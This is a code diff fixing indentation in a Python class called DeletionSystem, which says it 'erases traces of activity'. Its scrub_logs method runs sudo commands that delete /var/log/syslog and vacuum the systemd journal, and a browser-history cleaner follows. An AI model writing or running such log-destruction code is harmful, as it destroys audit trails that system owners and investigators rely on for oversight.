@@ -96,21 +96,16 @@ class DeletionSystem:
  """Erases traces of activity using Linux tools."""
  def __init__(self):
      self.deleted_files = []
-
+        
  def scrub_logs(self):
-     """Uses shell commands to delete logs."""
-     # Requires admin/root to fully clear logs
-     commands = [
-     "sudo rm -rf /var/log/syslog",
-     "sudo journalctl --rotate",
-     "sudo journalctl --vacuum-time=1s"
-     ]
-     for cmd in commands:
-         try:
-             subprocess.run(cmd, shell=True, check=True)
-             self.deleted_files.append(cmd)
- except subprocess.CalledProcessError:
-     print(f"[SYS] Failed to run {cmd}")
+        """Uses shell commands to delete logs."""
+        commands = ["sudo rm -rf /var/log/syslog", "sudo journalctl --rotate", "sudo journalctl --vacuum-time=1s"]
+        for cmd in commands:
+            try:
+                subprocess.run(cmd, shell=True, check=True)
+                self.deleted_files.append(cmd)
+            except subprocess.CalledProcessError: # <--- Syntax error occurs here
+                print(f"[SYS] Failed to run {cmd}")
 
  def clear_browsing_history(self):
      """Cleans browser history and cache."""
